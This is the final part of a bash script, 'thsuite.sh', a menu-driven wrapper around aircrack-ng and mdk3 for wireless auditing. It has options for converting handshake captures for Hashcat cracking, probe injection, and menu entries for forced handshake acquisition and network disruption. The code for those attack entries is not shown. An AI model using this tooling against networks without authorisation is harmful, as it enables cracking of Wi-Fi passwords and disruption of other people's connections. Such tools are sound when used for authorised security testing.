		echo $GRN">$STD Latest thsuite.sh version has been saved to $GRN$LOC/thsuite.sh$STD"
		#tail -n 30 $LOC/thsuite.sh | sed -n "/$VERS/,\$p"
		echo $GRN">$STD Please restart$GRN thsuite.sh$STD"
		f_exit
		else
		f_exit
		fi
	elif [ "$VERS" == "$NEW_VERS" ] ; then
	echo $GRN">$STD Current version in use $GRN$VERS$STD is the latest version available."
	sleep 1
	f_exit
	fi
f_exit
}
#
##
### HELP INFORMATION
####################
f_help() {
clear
f_header
echo $STD"  By TAPE          thsuite $VERS"
echo $STD"
Menu based script to simplify the standard commands used
when performing wireless auditing/reconnaissance.

WIKI on THSuite can be found at:
http://code.google.com/p/thsuite/"
echo $STD"
Written on THS-OS v3 (CR4CK3RB0X) and Kali Linux
Tested on both with some options performing better on Kali"
f_exit
}
#
##
### MISCELLANEOUS OPTIONS
#########################
f_misc() {
f_clean
clear
f_header
echo $BLU">$STD Miscellaneous options" 
echo $BLU"
OPTIONS$STD
1  Convert .cap to .hccap (for use with Hashcat)
2  Test whether a network is in sending/injection range
Q  Back to main menu
"
echo -ne "Enter choice from above menu: "$GRN
read MISC_MENU
	if [ "$MISC_MENU" == "q" ] || [ "$MISC_MENU" == "Q" ] ; then 
	echo $STD""
	f_menu
	elif [ "$MISC_MENU" == "" ] ; then f_menu
	elif [[ "$MISC_MENU" != [1-2] ]]; then
	echo $RED">$STD Input error $RED[$STD$MISC_MENU$RED]$STD must be an entry from the above menu"$STD
	sleep 1
	f_misc
	fi
# Option 1
if [ "$MISC_MENU" == "1" ] ; then 
clear
f_header
echo $BLU">$STD Convert .cap to .hccap" 
echo $STD
echo $BLUN"Hit Enter to return to previous menu"$STD
echo -n $GRN">$STD Enter .cap file to convert: "
read CAPIN
while [ ! -e $CAPIN ] || [ "$CAPIN" == "" ]  ; do
if [ "$CAPIN" == "" ] ; then f_misc ; fi
echo $RED">$STD Input error $RED[$STD$CAPIN$RED]$STD File does not exist"
echo -n $GRN">$STD Enter .cap file to convert: "
read CAPIN
done
echo $GRN">$STD Converting $GRNN$CAPIN$STD to .hccap" 
HCCAP=$(echo $CAPIN | sed 's/.cap//')
xterm -T THSuite -geometry -0-0 -e aircrack-ng $CAPIN -J $HCCAP
echo $GRN">$STD .hccap file $GRNN"$HCCAP".hccap$STD has been created"
echo -n $STD"
hit Enter to continue "
read ENTER
if [ "$ENTER" == "q" ] || [ "$ENTER" == "Q" ] ; then f_menu ; fi

# Option 2
elif [ "$MISC_MENU" == "2" ] ; then 
clear
f_header
echo $BLU">$STD Test if network is in sending range"
echo $BLUN"
This function sends out probes and waits for probe responses.
If no responses are received, you could consider trying to
increase the TX power of your card (Wireless Interface menu)"
echo $STD
echo $STD"Available interface(s);"
f_exist
f_mon_check
f_iface_stat
#Setting interface
echo $STD
echo -ne $GRN">$STD Enter monitor/injection interface: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_menu ; fi
while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE ; do
echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
echo -ne $GRN">$STD Enter monitor/injection interface: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_menu ; fi
done
if [[ ! "$IFACE" =~ "mon" ]] ; then
	echo $RED"> [$STD$IFACE$RED]$STD is not a monitor interface"
	sleep 1.5
	f_misc
fi
echo $BLUN"Required Input"$STD 
echo -n $GRN">$STD Enter SSID to probe: $GRN"
read SSID
if [ "$SSID" == "" ] ; then f_misc ; fi
echo -n $GRN">$STD Enter channel: $GRN"
read CHAN
while [ ! `expr $CHAN + 1 2> /dev/null` ] || [ "$CHAN" == "" ] ; do
if [ "$CHAN" == "" ] ; then f_misc ; fi
echo $RED">$STD Input error $RED[$STD$CHAN$RED]$STD Must be valid channel number" 
echo -n $GRN">$STD Enter channel: $GRN"
done

echo $GRN">$STD Probing SSID $GRN$SSID$STD"
echo -n $STD"Ctrl-C to quit the probing"
xterm -T THSuite -geometry -0+0 -e mdk3 $IFACE p -c $CHAN -e $SSID
fi
f_misc
}
#
##
### MENU ITEMS 
f_menu() {
while :
do
clear
f_header
echo $STD"   By TAPE"$STD
echo $BLU"Teh Hawt Stuff"
echo $STD"=============="
cat << !
1  Wireless Interfaces
2  MAC address manipulation
3  Wireless Scanning
4  View previous scans/captures
5  Forced handshake acquisition
6  Wireless network disruption 
m  Miscellaneous

h  help info
u  update check
v  version info
Q  Exit
!
echo ""
echo -ne $STD"Choose from the above menu: "$GRN
read menu


case $menu in
1) f_iface ;;
2) f_mac ;;
3) f_wireless_scan ;;
4) f_list_wireless ;;
5) f_force_wpa ;;
6) f_wireless_disruption ;;
h) f_help ;;
m) f_misc ;;
u) f_update ;;
q) f_exit ;; 
Q) f_exit ;;
v) f_vers ;;
*) echo $RED">$STD Input error $RED[$STD$menu$RED]$STD not a valid menu item"$STD; sleep 0.5 ;;
esac
done
}
#
##
### START SCRIPT
################

if [ $# -ne 0 ]; then
while getopts ":o:" opt; do
  case $opt in
	o) SAVEDIR=$OPTARG ;;
  esac
done
f_menu
else
f_menu
fi
#
##
### VERSION HISTORY
###################
# v0.1 Released 14-08-2013
# v0.2 Released 18-08-2013
# - Made some minor alterations to menu names (option 5).
# - Made Enter in menu 1 sub-menu return to menu 1 instead of main menu
# - Altered the save name for files when doing scan for associated clients (5-2) to avoid errors.
# - Included a switch 'o' which you can run on thsuite to alter save directory.
#   ( ./thsuite.sh -o your/chosen/save/directory )
# - Included error if failed to correctly create handshake cap (5-1, 5-2)
# - Changed file deletion to include 'a' for all files instead of requiring a seperate menu.
# - Removed redundant function f_iface_mac
# - Created Miscellaneous option 'm' ;  
#   * Included conversion from .cap to .hccap
#   * Included test to see whether target network is in range of adapter's sending range (mdk3 p)
# - Included fake AP generation option in Wireless Disruption.
# - Removed works in progress from Wireless Disruption menu

#
##
### TO DO
#########
# - Optimise code to reduce size / improve performance.
# - ? Check for errors when deauth attack fails (5-1 / 5-2) to avoid unexpected errors (waiting for bug reports).
# - ? Improve checking of monitor mode to allow names other than mon* (waiting for advice after more usage).
# - ? Increase wireless disruption capabilities.

